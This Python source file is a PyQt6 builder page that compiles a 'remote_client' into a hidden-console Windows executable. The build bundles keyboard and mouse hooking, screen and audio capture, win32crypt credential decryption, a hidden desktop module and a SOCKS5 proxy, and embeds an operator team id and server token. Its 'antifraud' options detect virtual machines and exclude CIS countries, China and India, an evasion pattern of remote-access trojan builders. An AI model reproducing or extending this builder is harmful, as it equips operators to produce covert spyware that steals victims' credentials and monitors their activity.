import importlib.util
import os
import subprocess
import sys
import tempfile
from dataclasses import dataclass
import json
from pathlib import Path
from typing import Optional

from PyQt6 import QtCore, QtGui, QtWidgets

from ...core.api import DEFAULT_API_TOKEN, DEFAULT_API_URL
from ...core.i18n import I18n
from ...core.logging import EventLogger
from ...core.theme import THEMES
from ...core.settings import SettingsStore
from ..common import GlassFrame, make_button


@dataclass
class BuildOptions:
    source_dir: Path
    entrypoint: Path
    output_name: str
    team_id: str
    antifraud_vm: bool
    antifraud_region: bool
    antifraud_countries: list[str]
    output_dir: Path
    icon_path: Optional[Path]
    mode: str
    console: str
    server_url: str
    api_token: str
    activity_tracker: bool = False


class BuilderWorker(QtCore.QThread):
    log_line = QtCore.pyqtSignal(str)
    progress = QtCore.pyqtSignal(int)
    finished = QtCore.pyqtSignal(bool, str, str)

    def __init__(self, options: BuildOptions):
        super().__init__()
        self.options = options
        self._build_python: Optional[str] = None
        self._packaging_active = False
        self._packaging_progress = 0

    def run(self) -> None:
        self._set_progress(5)
        build_python = self._resolve_build_python()
        if not build_python:
            self.finished.emit(False, "", "deps")
            return
        self.log_line.emit(f"Using build python: {build_python}")
        self._set_progress(20)
        if not self._ensure_build_tooling(build_python):
            self.finished.emit(False, "", "deps")
            return
        self._set_progress(38)
        if not self._ensure_build_dependencies(build_python):
            self.finished.emit(False, "", "deps")
            return
        self._set_progress(56)

        self._cleanup_output_dir()
        add_data_args, temp_dir = self._build_add_data_args()
        paths_args = self._build_paths_args()
        collect_args = self._build_collect_args()
        exclude_args = self._build_exclude_args()
        self._set_progress(68)
        cmd = [
            build_python,
            "-m",
            "PyInstaller",
            "--noconfirm",
            "--clean",
            "--name",
            self.options.output_name,
         ]
        cmd.append("--onefile")
        if self.options.console == "hide":
            cmd.append("--noconsole")
        if self.options.icon_path:
            cmd.extend(["--icon", str(self.options.icon_path)])
        cmd.extend(["--distpath", str(self.options.output_dir)])
        cmd.extend(paths_args)
        cmd.extend(collect_args)
        cmd.extend(exclude_args)
        cmd.extend(add_data_args)
        cmd.append(str(self.options.entrypoint))

        self.log_line.emit(" ".join(cmd))
        try:
            self._packaging_active = True
            self._packaging_progress = 68
            exit_code = self._run_command(cmd, cwd=self.options.source_dir)
            self._packaging_active = False
            if exit_code == 0:
                output = str(self.options.output_dir / f"{self.options.output_name}.exe")
                self._set_progress(100)
                self.finished.emit(True, output, "")
            else:
                self.finished.emit(False, "", "failed")
        finally:
            self._packaging_active = False
            if temp_dir is not None:
                temp_dir.cleanup()

    def _run_command(self, cmd: list[str], cwd: Path | None = None) -> int:
        try:
            process = subprocess.Popen(
                cmd,
                cwd=str(cwd) if cwd else None,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                env=self._build_env(),
            )
        except OSError as exc:
            self.log_line.emit(f"Failed to start process: {exc}")
            return 1
        if process.stdout:
            for line in process.stdout:
                text = line.rstrip()
                self.log_line.emit(text)
                self._advance_packaging_progress(text)
        return process.wait()

    def _set_progress(self, value: int) -> None:
        clamped = max(0, min(100, int(value)))
        self.progress.emit(clamped)

    def _advance_packaging_progress(self, line: str) -> None:
        if not self._packaging_active:
            return
        if self._packaging_progress >= 95:
            return
        normalized = line.strip().lower()
        if not normalized:
            return
        boost = 1
        if any(
            token in normalized
            for token in (
                "analyzing",
                "collecting",
                "building",
                "copying",
                "writing",
                "updating",
                "appending",
                "compressing",
            )
        ):
            boost = 2
        self._packaging_progress = min(95, self._packaging_progress + boost)
        self._set_progress(self._packaging_progress)

    @staticmethod
    def _build_env() -> dict[str, str]:
        env = os.environ.copy()
        env.setdefault("PIP_DISABLE_PIP_VERSION_CHECK", "1")
        env.setdefault("PYTHONUTF8", "1")
        return env

    def _resolve_build_python(self) -> Optional[str]:
        if self._build_python:
            return self._build_python
        override = os.getenv("RC_BUILDER_PYTHON", "").strip()
        if override and Path(override).exists():
            self._build_python = override
            return self._build_python
        venv_dir = self.options.source_dir / ".rc_build_venv"
        python_path = venv_dir / ("Scripts/python.exe" if os.name == "nt" else "bin/python")
        if not python_path.exists():
            self.log_line.emit(f"Creating build venv: {venv_dir}")
            candidates = [sys.executable]
            if os.name != "nt":
                candidates.append("python3")
            candidates.append("python")
            created = False
            for candidate in candidates:
                exit_code = self._run_command(
                    [candidate, "-m", "venv", str(venv_dir)],
                    cwd=self.options.source_dir,
                )
                if exit_code == 0:
                    created = True
                    break
            if not created:
                self.log_line.emit("Failed to create build venv.")
                return None
        if not python_path.exists():
            self.log_line.emit("Build venv Python not found after creation.")
            return None
        self._build_python = str(python_path)
        return self._build_python

    def _required_modules(self) -> list[str]:
        modules = [
            "av",
            "aiortc",
            "mss",
            "numpy",
            "sounddevice",
            "pynput",
            "cryptography",
        ]
        if os.name == "nt":
            modules.append("win32crypt")
        return modules

    def _missing_modules(self, python_path: str) -> list[str]:
        mods = self._required_modules()
        payload = (
            "import importlib.util, json; "
            f"mods={mods!r}; "
            "missing=[m for m in mods if importlib.util.find_spec(m) is None]; "
            "print(json.dumps(missing))"
        )
        try:
            result = subprocess.run(
                [python_path, "-c", payload],
                capture_output=True,
                text=True,
                env=self._build_env(),
            )
        except OSError as exc:
            self.log_line.emit(f"Failed to check modules: {exc}")
            return mods
        if result.returncode != 0:
            self.log_line.emit(f"Module check failed: {result.stderr.strip()}")
            return mods
        try:
            return json.loads(result.stdout.strip() or "[]")
        except json.JSONDecodeError:
            return mods

    def _ensure_build_dependencies(self, python_path: str) -> bool:
        missing = self._missing_modules(python_path)
        if not missing:
            return True
        requirements = self.options.source_dir / "requirements-client.txt"
        if not requirements.exists():
            self.log_line.emit(
                f"Missing build dependencies ({', '.join(missing)}), and requirements-client.txt not found."
            )
            return False
        self._ensure_pip(python_path)
        self.log_line.emit(
            f"Installing build dependencies: {', '.join(missing)}"
        )
        exit_code = self._run_command(
            [python_path, "-m", "pip", "install", "-r", str(requirements)],
            cwd=self.options.source_dir,
        )
        if exit_code != 0:
            self.log_line.emit("Dependency installation failed.")
            return False
        remaining = self._missing_modules(python_path)
        if remaining:
            self.log_line.emit(
                f"Dependencies still missing after install: {', '.join(remaining)}"
            )
            return False
        return True

    def _install_pyinstaller(self, python_path: str) -> bool:
        self.log_line.emit("Installing PyInstaller...")
        exit_code = self._run_command(
            [python_path, "-m", "pip", "install", "pyinstaller"],
            cwd=self.options.source_dir,
        )
        return exit_code == 0

    def _ensure_pip(self, python_path: str) -> None:
        exit_code = self._run_command(
            [python_path, "-m", "pip", "install", "--upgrade", "pip", "setuptools", "wheel"],
            cwd=self.options.source_dir,
        )
        if exit_code != 0:
            self.log_line.emit("pip upgrade failed; continuing with existing pip.")

    def _ensure_build_tooling(self, python_path: str) -> bool:
        self._ensure_pip(python_path)
        if self._module_available(python_path, "PyInstaller"):
            return True
        return self._install_pyinstaller(python_path)

    def _module_available(self, python_path: str, module: str) -> bool:
        payload = (
            "import importlib.util, sys; "
            f"sys.exit(0 if importlib.util.find_spec({module!r}) else 1)"
        )
        try:
            result = subprocess.run(
                [python_path, "-c", payload],
                capture_output=True,
                text=True,
                env=self._build_env(),
            )
        except OSError as exc:
            self.log_line.emit(f"Failed to check module '{module}': {exc}")
            return False
        return result.returncode == 0

    def _build_collect_args(self) -> list[str]:
        args: list[str] = []
        for module in ("pynput", "av", "aiortc", "sounddevice", "mss", "numpy"):
            args.extend(["--collect-all", module])
        # When building from e.g. `remote_client/main.py`, PyInstaller can miss
        # package-relative imports. Collecting the whole package avoids runtime
        # ModuleNotFoundError like `remote_client.config`.
        args.extend(["--collect-submodules", "remote_client"])
        hidden_imports = [
            "win32crypt",
            "cryptography",
            "pynput",
            "pynput.mouse",
            "pynput.keyboard",
            "remote_client.config",
            "remote_client.apps",
            "remote_client.apps.launcher",
            "remote_client.windows.hidden_desktop",
            "remote_client.proxy.socks5_server",
        ]
        for module in hidden_imports:
            args.extend(["--hidden-import", module])
        return args

    @staticmethod
    def _find_top_package_dir(start_dir: Path) -> Optional[Path]:
        """Return the top-most Python package directory that contains start_dir.

        Example: if `start_dir` is `.../pkg/subpkg`, returns `.../pkg`.
        """
        current = start_dir
        top_pkg: Optional[Path] = None
        while (current / "__init__.py").exists():
            top_pkg = current
            current = current.parent
        return top_pkg

    def _build_paths_args(self) -> list[str]:
        """Ensure local packages are importable for PyInstaller analysis.

        If the entrypoint lives inside a package directory (has `__init__.py`),
        we add the parent directory to `--paths` so absolute imports like
        `remote_client.*` resolve during analysis.
        """
        roots: list[Path] = []

        top_pkg = self._find_top_package_dir(self.options.entrypoint.parent)
        if top_pkg is not None:
            roots.append(top_pkg.parent)

        roots.append(self.options.source_dir)

        seen: set[str] = set()
        args: list[str] = []
        for root in roots:
            root_str = str(root.resolve())
            if root_str in seen:
                continue
            seen.add(root_str)
            args.extend(["--paths", root_str])
        return args

    def _build_exclude_args(self) -> list[str]:
        excludes = [
            "numpy.f2py.tests",
            "pytest",
        ]
        args: list[str] = []
        for module in excludes:
            args.extend(["--exclude-module", module])
        return args

    def _cleanup_output_dir(self) -> None:
        output_dir = self.options.output_dir
        for filename in ("rc_team_id.txt", "rc_antifraud.json", "rc_server.json"):
            path = output_dir / filename
            if not path.exists():
                continue
            try:
                path.unlink()
            except OSError:
                self.log_line.emit(f"Failed to remove {filename} from output directory.")

    def _build_add_data_args(self) -> tuple[list[str], tempfile.TemporaryDirectory | None]:
        temp_dir = tempfile.TemporaryDirectory(prefix="rc_build_")
        asset_dir = Path(temp_dir.name) / "remote_client"
        try:
            asset_dir.mkdir(parents=True, exist_ok=True)
        except OSError:
            self.log_line.emit("Failed to prepare embedded build assets.")
            temp_dir.cleanup()
            return [], None

        args: list[str] = []
        team_file = self._write_team_id_file(asset_dir)
        if team_file:
            args.extend(["--add-data", f"{team_file}{os.pathsep}remote_client"])
        antifraud_file = self._write_antifraud_config(asset_dir)
        if antifraud_file:
            args.extend(["--add-data", f"{antifraud_file}{os.pathsep}remote_client"])
        server_file = self._write_server_config(asset_dir)
        if server_file:
            args.extend(["--add-data", f"{server_file}{os.pathsep}remote_client"])
        activity_file = self._write_activity_tracker_env(asset_dir)
        if activity_file:
            args.extend(["--add-data", f"{activity_file}{os.pathsep}remote_client"])
        return args, temp_dir

    def _write_team_id_file(self, asset_dir: Path) -> Optional[Path]:
        team_id = (self.options.team_id or "").strip()
        if not team_id:
            return None
        team_file = asset_dir / "rc_team_id.txt"
        try:
            team_file.write_text(team_id, encoding="utf-8")
            return team_file
        except OSError:
            self.log_line.emit("Failed to write the team id file.")
            return None

    def _write_antifraud_config(self, asset_dir: Path) -> Optional[Path]:
        payload = {
            "vm_enabled": bool(self.options.antifraud_vm),
            "region_enabled": bool(self.options.antifraud_region),
            "countries": list(self.options.antifraud_countries),
        }
        config_file = asset_dir / "rc_antifraud.json"
        try:
            config_file.write_text(json.dumps(payload, indent=2), encoding="utf-8")
            return config_file
        except OSError:
            self.log_line.emit("Failed to write the anti-fraud config file.")
            return None

    def _write_server_config(self, asset_dir: Path) -> Optional[Path]:
        server_url = (self.options.server_url or "").strip()
        token = (self.options.api_token or "").strip()
        if not server_url:
            return None
        config_file = asset_dir / "rc_server.json"
        payload = {
            "server_url": server_url,
            "signaling_url": server_url,
            "api_url": server_url,
        }
        if token:
            payload["api_token"] = token
            payload["signaling_token"] = token
        try:
            config_file.write_text(json.dumps(payload, indent=2), encoding="utf-8")
            return config_file
        except OSError:
            self.log_line.emit("Failed to write the server config file.")
            return None

    def _write_activity_tracker_env(self, asset_dir: Path) -> Optional[Path]:
        """Write environment file for activity tracker configuration."""
        if not self.options.activity_tracker:
            return None
        env_file = asset_dir / "rc_activity.env"
        try:
            env_file.write_text("RC_ACTIVITY_TRACKER=1\n", encoding="utf-8")
            return env_file
        except OSError:
            self.log_line.emit("Failed to write the activity tracker env file.")
            return None


class CompilerPage(QtWidgets.QWidget):
    def __init__(self, i18n: I18n, settings: SettingsStore, logger: EventLogger):
        super().__init__()
        self.i18n = i18n
        self.settings = settings
        self.logger = logger
        self.worker: Optional[BuilderWorker] = None
        self._build_logs: list[str] = []
        self.region_actions: dict[str, QtGui.QAction] = {}
        self.theme = THEMES.get(self.settings.get("theme", "dark"), THEMES["dark"])

        layout = QtWidgets.QVBoxLayout(self)
        layout.setSpacing(16)
        layout.setContentsMargins(0, 0, 0, 0)

        toolbar = GlassFrame(radius=18, tone="card_alt", tint_alpha=160, border_alpha=70)
        toolbar.setObjectName("ToolbarCard")
        header = QtWidgets.QVBoxLayout(toolbar)
        header.setContentsMargins(16, 14, 16, 14)
        header.setSpacing(6)
        self.title_label = QtWidgets.QLabel()
        self.title_label.setObjectName("PageTitle")
        self.subtitle_label = QtWidgets.QLabel()
        self.subtitle_label.setObjectName("PageSubtitle")
        header.addWidget(self.title_label)
        header.addWidget(self.subtitle_label)
        layout.addWidget(toolbar)

        form_card = GlassFrame(radius=20, tone="card", tint_alpha=170, border_alpha=70)
        form_card.setObjectName("Card")
        form_layout = QtWidgets.QGridLayout(form_card)
        form_layout.setHorizontalSpacing(16)
        form_layout.setVerticalSpacing(12)

        self.source_label = QtWidgets.QLabel()
        self.source_input = QtWidgets.QLineEdit()
        self.source_button = make_button("", "ghost")
        self.source_button.clicked.connect(self.pick_source_dir)

        self.entry_label = QtWidgets.QLabel()
        self.entry_input = QtWidgets.QLineEdit()
        self.entry_button = make_button("", "ghost")
        self.entry_button.clicked.connect(self.pick_entrypoint)

        self.output_name_label = QtWidgets.QLabel()
        self.output_name_input = QtWidgets.QLineEdit()

        self.specifications_card = GlassFrame(
            radius=14, tone="card", tint_alpha=150, border_alpha=60
        )
        self.specifications_card.setObjectName("ToolbarCard")
        specifications_layout = QtWidgets.QVBoxLayout(self.specifications_card)
        specifications_layout.setContentsMargins(12, 10, 12, 10)
        specifications_layout.setSpacing(8)

        self.specifications_label = QtWidgets.QLabel()
        self.specifications_label.setObjectName("SectionTitle")
        specifications_layout.addWidget(self.specifications_label)

        self.vm_check = QtWidgets.QCheckBox()
        self.region_check = QtWidgets.QCheckBox()
        self.region_button = make_button("", "ghost")
        self.region_menu = QtWidgets.QMenu(self.region_button)
        self.region_button.setMenu(self.region_menu)
        self.region_check.toggled.connect(self._update_region_visibility)
        self._apply_region_menu_theme()

        self.activity_tracker_check = QtWidgets.QCheckBox()

        self.region_control = QtWidgets.QWidget()
        region_control_layout = QtWidgets.QHBoxLayout(self.region_control)
        region_control_layout.setContentsMargins(0, 0, 0, 0)
        region_control_layout.setSpacing(8)
        region_control_layout.addWidget(self.region_check)
        region_control_layout.addWidget(
            self.region_button, 0, QtCore.Qt.AlignmentFlag.AlignLeft
        )
        region_control_layout.addStretch()

        self.specifications_grid = QtWidgets.QGridLayout()
        self.specifications_grid.setContentsMargins(0, 0, 0, 0)
        self.specifications_grid.setHorizontalSpacing(12)
        self.specifications_grid.setVerticalSpacing(8)
        specifications_layout.addLayout(self.specifications_grid)

        self._specification_widgets: list[QtWidgets.QWidget] = [
            self.vm_check,
            self.region_control,
            self.activity_tracker_check,
        ]
        self._specification_columns = 0

        self.output_dir_label = QtWidgets.QLabel()
        self.output_dir_input = QtWidgets.QLineEdit()
        self.output_dir_button = make_button("", "ghost")
        self.output_dir_button.clicked.connect(self.pick_output_dir)

        self.icon_label = QtWidgets.QLabel()
        self.icon_input = QtWidgets.QLineEdit()
        self.icon_button = make_button("", "ghost")
        self.icon_button.clicked.connect(self.pick_icon)

        self.mode_label = QtWidgets.QLabel()
        self.mode_combo = QtWidgets.QComboBox()
        self.mode_combo.addItem(self.i18n.t("compiler_mode_onefile"), "onefile")
        self.mode_combo.setEnabled(False)

        form_layout.addWidget(self.source_label, 0, 0)
        form_layout.addWidget(self.source_input, 0, 1)
        form_layout.addWidget(self.source_button, 0, 2)
        form_layout.addWidget(self.entry_label, 1, 0)
        form_layout.addWidget(self.entry_input, 1, 1)
        form_layout.addWidget(self.entry_button, 1, 2)
        form_layout.addWidget(self.output_name_label, 2, 0)
        form_layout.addWidget(self.output_name_input, 2, 1, 1, 2)
        form_layout.addWidget(self.specifications_card, 3, 0, 1, 3)
        form_layout.addWidget(self.output_dir_label, 4, 0)
        form_layout.addWidget(self.output_dir_input, 4, 1)
        form_layout.addWidget(self.output_dir_button, 4, 2)
        form_layout.addWidget(self.icon_label, 5, 0)
        form_layout.addWidget(self.icon_input, 5, 1)
        form_layout.addWidget(self.icon_button, 5, 2)
        form_layout.addWidget(self.mode_label, 6, 0)
        form_layout.addWidget(self.mode_combo, 6, 1, 1, 2)

        layout.addWidget(form_card)

        progress_wrap = QtWidgets.QWidget()
        progress_layout = QtWidgets.QVBoxLayout(progress_wrap)
        progress_layout.setContentsMargins(0, 0, 0, 0)
        progress_layout.setSpacing(0)
        self.progress_bar = QtWidgets.QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(0)
        self.progress_bar.setTextVisible(False)
        self.progress_bar.setMinimumHeight(14)
        self.progress_bar.setProperty("status", "idle")
        progress_layout.addWidget(self.progress_bar)
        layout.addWidget(progress_wrap)

        actions = QtWidgets.QHBoxLayout()
        self.build_button = make_button("", "primary")
        self.build_button.clicked.connect(self.start_build)
        self.status_label = QtWidgets.QLabel()
        self.status_label.setObjectName("Muted")
        self.status_label.setProperty("state", "warn")
        self.status_label.setVisible(False)
        actions.addWidget(self.build_button)
        actions.addStretch()
        layout.addLayout(actions)

        self.load_state()
        self.apply_translations()
        self._update_region_visibility(self.region_check.isChecked())
        QtCore.QTimer.singleShot(0, self._refresh_specification_layout)

    def load_state(self) -> None:
        builder = self.settings.get("builder", {})
        self.source_input.setText(builder.get("source_dir", ""))
        self.entry_input.setText(builder.get("entrypoint", ""))
        self.output_name_input.setText(builder.get("output_name", "RemoteControllerClient"))
        antifraud = builder.get("antifraud", {})
        if not isinstance(antifraud, dict):
            antifraud = {}
        vm_enabled = antifraud.get("vm", True)
        region_enabled = antifraud.get("region", True)
        countries = antifraud.get("countries")
        if not isinstance(countries, list) or not countries:
            countries = self._default_antifraud_countries()
        self.vm_check.setChecked(bool(vm_enabled))
        self.region_check.setChecked(bool(region_enabled))
        self._build_region_menu()
        self._set_selected_countries(countries)
        self.output_dir_input.setText(builder.get("output_dir", ""))
        self.icon_input.setText(builder.get("icon_path", ""))
        self.mode_combo.setCurrentIndex(0)

    def apply_translations(self) -> None:
        self.title_label.setText(self.i18n.t("compiler_title"))
        self.subtitle_label.setText(self.i18n.t("compiler_subtitle"))
        self.source_label.setText(self.i18n.t("compiler_source"))
        self.entry_label.setText(self.i18n.t("compiler_entry"))
        self.output_name_label.setText(self.i18n.t("compiler_output_name"))
        self.specifications_label.setText(self.i18n.t("compiler_specifications"))
        self.vm_check.setText(self.i18n.t("compiler_antifraud_vm"))
        self.region_check.setText(self.i18n.t("compiler_antifraud_region"))
        self.region_button.setText(self.i18n.t("compiler_regions"))
        self.activity_tracker_check.setText(self.i18n.t("compiler_activity_tracker"))
        self.output_dir_label.setText(self.i18n.t("compiler_output_dir"))
        self.icon_label.setText(self.i18n.t("compiler_icon"))
        self.mode_label.setText(self.i18n.t("compiler_mode"))
        self.source_button.setText(self.i18n.t("compiler_browse"))
        self.entry_button.setText(self.i18n.t("compiler_browse"))
        self.output_dir_button.setText(self.i18n.t("compiler_browse"))
        self.icon_button.setText(self.i18n.t("compiler_browse"))
        self.build_button.setText(self.i18n.t("compiler_build"))
        self.status_label.setText(self.i18n.t("compiler_status_idle"))
        self.status_label.setProperty("state", "warn")
        self.status_label.style().unpolish(self.status_label)
        self.status_label.style().polish(self.status_label)
        self._set_progress_ui(0, "idle")
        self.mode_combo.setItemText(0, self.i18n.t("compiler_mode_onefile"))
        self._build_region_menu()
        self._refresh_specification_layout()

    def _set_progress_ui(self, value: int, state: str) -> None:
        clamped = max(0, min(100, int(value)))
        self.progress_bar.setValue(clamped)
        self.progress_bar.setProperty("status", state)
        self.progress_bar.style().unpolish(self.progress_bar)
        self.progress_bar.style().polish(self.progress_bar)

    def _capture_worker_log(self, line: str) -> None:
        if not line:
            return
        self._build_logs.append(line)
        if len(self._build_logs) > 2000:
            self._build_logs = self._build_logs[-2000:]

    def _handle_worker_progress(self, value: int) -> None:
        current = self.progress_bar.value()
        next_value = max(current, value)
        self._set_progress_ui(next_value, "active")

    def pick_source_dir(self) -> None:
        path = QtWidgets.QFileDialog.getExistingDirectory(self, self.i18n.t("compiler_source"))
        if path:
            self.source_input.setText(path)
            guessed = self.guess_entrypoint(Path(path))
            if guessed and not self.entry_input.text().strip():
                self.entry_input.setText(str(guessed))

    def pick_entrypoint(self) -> None:
        path, _ = QtWidgets.QFileDialog.getOpenFileName(
            self, self.i18n.t("compiler_entry"), filter="Python Files (*.py)"
        )
        if path:
            self.entry_input.setText(path)

    def pick_output_dir(self) -> None:
        path = QtWidgets.QFileDialog.getExistingDirectory(self, self.i18n.t("compiler_output_dir"))
        if path:
            self.output_dir_input.setText(path)

    def pick_icon(self) -> None:
        path, _ = QtWidgets.QFileDialog.getOpenFileName(
            self, self.i18n.t("compiler_icon"), filter="Icon Files (*.ico)"
        )
        if path:
            self.icon_input.setText(path)

    def guess_entrypoint(self, source_dir: Path) -> Optional[Path]:
        candidates = ["client.py", "main.py", "app.py", "remote_client/main.py"]
        for candidate in candidates:
            candidate_path = source_dir / candidate
            if candidate_path.exists():
                return candidate_path
        return None

    def _resolve_server_settings(self) -> tuple[str, str]:
        env_url = os.getenv("RC_SIGNALING_URL", "").strip()
        env_token = os.getenv("RC_SIGNALING_TOKEN", "").strip()
        api_url = str(self.settings.get("api_url", "") or "").strip()
        api_token = str(self.settings.get("api_token", "") or "").strip()
        if not env_url:
            env_url = api_url
        if not env_token:
            env_token = api_token
        if not env_url:
            env_url = DEFAULT_API_URL
        if not env_token:
            env_token = DEFAULT_API_TOKEN
        return env_url, env_token

    def start_build(self) -> None:
        source_dir = Path(self.source_input.text().strip())
        entrypoint = Path(self.entry_input.text().strip())
        output_name = self.output_name_input.text().strip()
        team_id = str(self.settings.get("operator_team_id", "") or "").strip()
        antifraud_vm = self.vm_check.isChecked()
        antifraud_region = self.region_check.isChecked()
        antifraud_countries = self._selected_countries()
        activity_tracker = self.activity_tracker_check.isChecked()
        output_dir_text = self.output_dir_input.text().strip() or str(source_dir / "dist")
        output_dir = Path(output_dir_text)
        icon_path = Path(self.icon_input.text().strip()) if self.icon_input.text().strip() else None
        mode = "onefile"
        console = "hide"
        server_url, api_token = self._resolve_server_settings()

        if not source_dir.exists() or not entrypoint.exists():
            self.status_label.setText(self.i18n.t("compiler_status_failed"))
            self.status_label.setProperty("state", "error")
            self.status_label.style().unpolish(self.status_label)
            self.status_label.style().polish(self.status_label)
            self._set_progress_ui(0, "error")
            return

        options = BuildOptions(
            source_dir=source_dir,
            entrypoint=entrypoint,
            output_name=output_name or "RemoteControllerClient",
            team_id=team_id,
            antifraud_vm=antifraud_vm,
            antifraud_region=antifraud_region,
            antifraud_countries=antifraud_countries,
            output_dir=output_dir,
            icon_path=icon_path,
            mode=mode,
            console=console,
            server_url=server_url,
            api_token=api_token,
            activity_tracker=activity_tracker,
        )
        self.persist_builder_state(options)
        self.status_label.setText(self.i18n.t("compiler_status_building"))
        self.status_label.setProperty("state", "warn")
        self.status_label.style().unpolish(self.status_label)
        self.status_label.style().polish(self.status_label)
        self._build_logs.clear()
        self._set_progress_ui(5, "active")
        self.build_button.setEnabled(False)
        self.logger.log("log_build_start", entry=entrypoint.name)

        self.worker = BuilderWorker(options)
        self.worker.log_line.connect(self._capture_worker_log)
        self.worker.progress.connect(self._handle_worker_progress)
        self.worker.finished.connect(self.finish_build)
        self.worker.start()

    def finish_build(self, success: bool, output: str, reason: str) -> None:
        self.build_button.setEnabled(True)
        self.worker = None
        if success:
            self.status_label.setText(self.i18n.t("compiler_status_done"))
            self.status_label.setProperty("state", "ok")
            self._set_progress_ui(100, "ok")
            self.logger.log("log_build_done", output=output)
        else:
            message = self.i18n.t("log_build_missing") if reason == "missing" else self.i18n.t("log_build_failed")
            self.status_label.setText(self.i18n.t("compiler_status_failed"))
            self.status_label.setProperty("state", "error")
            self.status_label.setToolTip(message)
            self._set_progress_ui(max(self.progress_bar.value(), 12), "error")
            self.logger.log("log_build_failed")
        self.status_label.style().unpolish(self.status_label)
        self.status_label.style().polish(self.status_label)

    def resizeEvent(self, event: QtGui.QResizeEvent) -> None:
        super().resizeEvent(event)
        self._refresh_specification_layout()

    def _refresh_specification_layout(self) -> None:
        available_width = self.specifications_card.width()
        if available_width <= 0:
            return

        if available_width < 440:
            columns = 1
        elif available_width < 760:
            columns = 2
        else:
            columns = 3

        if columns == self._specification_columns:
            return
        self._specification_columns = columns

        for widget in self._specification_widgets:
            self.specifications_grid.removeWidget(widget)
        for index in range(3):
            self.specifications_grid.setColumnStretch(index, 0)

        for index, widget in enumerate(self._specification_widgets):
            row = index // columns
            column = index % columns
            self.specifications_grid.addWidget(widget, row, column)

        for index in range(columns):
            self.specifications_grid.setColumnStretch(index, 1)

    def _apply_region_menu_theme(self) -> None:
        colors = self.theme.colors
        self.region_menu.setStyleSheet(
            "QMenu {"
            f"background: {colors['card']};"
            f"border: 1px solid {colors['border']};"
            "padding: 6px;"
            "}"
            "QMenu::item {"
            f"color: {colors['text']};"
            "padding: 6px 10px;"
            "border-radius: 6px;"
            "}"
            "QMenu::item:selected {"
            f"background: {colors['accent_soft']};"
            "}"
            "QMenu::item:disabled {"
            f"color: {colors['muted']};"
            "}"
        )

    def _update_region_visibility(self, enabled: bool) -> None:
        self.region_button.setVisible(enabled)

    def _default_antifraud_countries(self) -> list[str]:
        return [
            "AM",
            "AZ",
            "BY",
            "GE",
            "KZ",
            "KG",
            "MD",
            "RU",
            "TJ",
            "TM",
            "UA",
            "UZ",
            "CN",
            "IN",
        ]

    def _country_groups(self) -> list[tuple[str, list[tuple[str, str]]]]:
        return [
            (
                "compiler_regions_cis",
                [
                    ("AM", "country_am"),
                    ("AZ", "country_az"),
                    ("BY", "country_by"),
                    ("GE", "country_ge"),
                    ("KZ", "country_kz"),
                    ("KG", "country_kg"),
                    ("MD", "country_md"),
                    ("RU", "country_ru"),
                    ("TJ", "country_tj"),
                    ("TM", "country_tm"),
                    ("UA", "country_ua"),
                    ("UZ", "country_uz"),
                ],
            ),
            ("compiler_regions_china", [("CN", "country_cn")]),
            ("compiler_regions_india", [("IN", "country_in")]),
        ]

    def _build_region_menu(self) -> None:
        selected = self._selected_countries()
        self.region_menu.clear()
        self.region_actions = {}
        for section_key, entries in self._country_groups():
            self.region_menu.addSection(self.i18n.t(section_key))
            for code, label_key in entries:
                action = QtGui.QAction(self.i18n.t(label_key), self.region_menu)
                action.setCheckable(True)
                action.setChecked(code in selected)
                action.toggled.connect(self._update_regions_state)
                self.region_menu.addAction(action)
                self.region_actions[code] = action

    def _set_selected_countries(self, countries: list[str]) -> None:
        selected = {code.upper() for code in countries if code}
        if not self.region_actions:
            self._build_region_menu()
        for code, action in self.region_actions.items():
            action.setChecked(code in selected)

    def _selected_countries(self) -> list[str]:
        if not self.region_actions:
            return self._default_antifraud_countries()
        return [code for code, action in self.region_actions.items() if action.isChecked()]

    def _update_regions_state(self) -> None:
        if not self.region_check.isChecked():
            return
        if not self._selected_countries():
            self._set_selected_countries(self._default_antifraud_countries())

    def persist_builder_state(self, options: BuildOptions) -> None:
        self.settings.set(
            "builder",
            {
                "source_dir": str(options.source_dir),
                "entrypoint": str(options.entrypoint),
                "output_name": options.output_name,
                "antifraud": {
                    "vm": options.antifraud_vm,
                    "region": options.antifraud_region,
                    "countries": list(options.antifraud_countries),
                },
                "output_dir": str(options.output_dir),
                "icon_path": str(options.icon_path) if options.icon_path else "",
                "mode": "onefile",
                "console": "hide",
            },
        )
        self.settings.save()
